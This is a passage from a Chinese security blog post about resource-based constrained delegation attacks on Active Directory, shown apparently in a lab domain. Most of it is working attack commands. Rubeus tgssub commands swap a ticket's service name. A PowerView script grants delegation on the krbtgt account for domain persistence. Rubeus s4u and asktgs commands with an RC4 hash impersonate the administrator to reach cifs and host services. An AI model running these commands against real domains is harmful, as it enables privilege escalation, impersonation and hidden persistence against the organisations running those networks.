+<h4 id="使用Rebeus修改票据所请求的服务名："><a href="#使用Rebeus修改票据所请求的服务名：" class="headerlink" title="使用Rebeus修改票据所请求的服务名："></a>使用Rebeus修改票据所请求的服务名：</h4><p>语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
+
+<p>利用tgssub模块替换服务名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:host/oa /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:target.kirbi /altservice:cifs/oa /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205213839675.png" alt="image-20220205213839675"></p>
+<p>此时我们访问共享目录便具有权限了。</p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214033038.png" alt="image-20220205214033038"></p>
+<p>获得会话shell</p>
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205214102004.png" alt="image-20220205214102004"></p>
+<h4 id="利用基于资源的约束委派进行权限维持"><a href="#利用基于资源的约束委派进行权限维持" class="headerlink" title="利用基于资源的约束委派进行权限维持"></a>利用基于资源的约束委派进行权限维持</h4><p>根据基于资源的约束委派进行权限维持，主要有两种思路：</p>
+<ol>
+<li>配置注册的机器账户到Krbtgt基于资源的约束委派</li>
+<li>配置注册的机器账户到域控基于资源的约束委派</li>
+</ol>
+<h5 id="机器账户到Krbtgt基于资源的约束委派"><a href="#机器账户到Krbtgt基于资源的约束委派" class="headerlink" title="机器账户到Krbtgt基于资源的约束委派"></a>机器账户到Krbtgt基于资源的约束委派</h5><p>当我们拿下域管权限后，可以利用如下命令为krbtgt用户添加ACL用于基于资源的约束委派。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor <span class="literal">-ArgumentList</span> <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-4052809752-717748265-227546684-2104)&quot;</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line"><span class="built_in">Get-DomainUser</span> krbtgt | <span class="built_in">Set-DomainObject</span> <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;<span class="string">&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;</span>=<span class="variable">$SDBytes</span>&#125; <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225400564.png" alt="image-20220205225400564"></p>
+<p>成功修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，尝试请求票据，去除空格换行拿到Krbtgt用户的TGS票据，以便申请域内任意服务。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u  /user:evil$ /rc4:B1739F7FC8377E25C77CFA2DFBDC3EC7 /domain:attack.local /msdsspn:krbtgt /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205225930436.png" alt="image-20220205225930436"></p>
+<p>利用拿到的去除空格后的TGS票据修改，获取任意服务的访问权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:cifs/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br><span class="line">.\Rubeus.exe asktgs /user:evil$ /enctypes:rc4 /service:host/oa /domain:attack.local /ticket:doIExxxxxxx /ptt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE.assets/image-20220205233803496.png" alt="image-20220205233803496"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag"># 域渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/01/09/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/" rel="prev" title="约束委派攻击">
+      <i class="fa fa-chevron-left"></i> 约束委派攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E5%88%A9%E7%94%A8"><span class="nav-number">1.</span> <span class="nav-text">基于资源的约束委派利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%88%A9%E7%94%A8Powerview%E8%84%9A%E6%9C%AC%E4%BF%AE%E6%94%B9%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="nav-number">1.1.</span> <span class="nav-text">1.利用Powerview脚本修改属性值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%80%9A%E8%BF%87ActiveDirectory%E6%A8%A1%E5%9D%97%E4%BF%AE%E6%94%B9%E5%85%B6%E5%B1%9E%E6%80%A7%E5%80%BC"><span class="nav-number">1.2.</span> <span class="nav-text">2.通过ActiveDirectory模块修改其属性值</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8Rubeus%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="nav-number">1.3.</span> <span class="nav-text">利用Rubeus进行攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell"><span class="nav-number">1.3.1.</span> <span class="nav-text">获得稳定的shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%8F%E6%84%9F%E8%B4%A6%E6%88%B7%E4%B8%8D%E5%8F%AF%E8%A2%AB%E5%A7%94%E6%B4%BE%E9%97%AE%E9%A2%98"><span class="nav-number">2.</span> <span class="nav-text">敏感账户不可被委派问题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8Rebeus%E4%BF%AE%E6%94%B9%E7%A5%A8%E6%8D%AE%E6%89%80%E8%AF%B7%E6%B1%82%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%90%8D%EF%BC%9A"><span class="nav-number">2.1.</span> <span class="nav-text">使用Rebeus修改票据所请求的服务名：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E8%BF%9B%E8%A1%8C%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">2.2.</span> <span class="nav-text">利用基于资源的约束委派进行权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%BA%E5%99%A8%E8%B4%A6%E6%88%B7%E5%88%B0Krbtgt%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE"><span class="nav-number">2.2.1.</span> <span class="nav-text">机器账户到Krbtgt基于资源的约束委派</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Nayon"
+      src="/images/Nayon.png">
+  <p class="site-author-name" itemprop="name">Nayon</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">21</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      Links
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://0range-x.github.io/" title="https:&#x2F;&#x2F;0range-x.github.io&#x2F;" rel="noopener" target="_blank">0r@nge</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://txluck.github.io/" title="https:&#x2F;&#x2F;txluck.github.io&#x2F;" rel="noopener" target="_blank">永安寺</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Nayon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
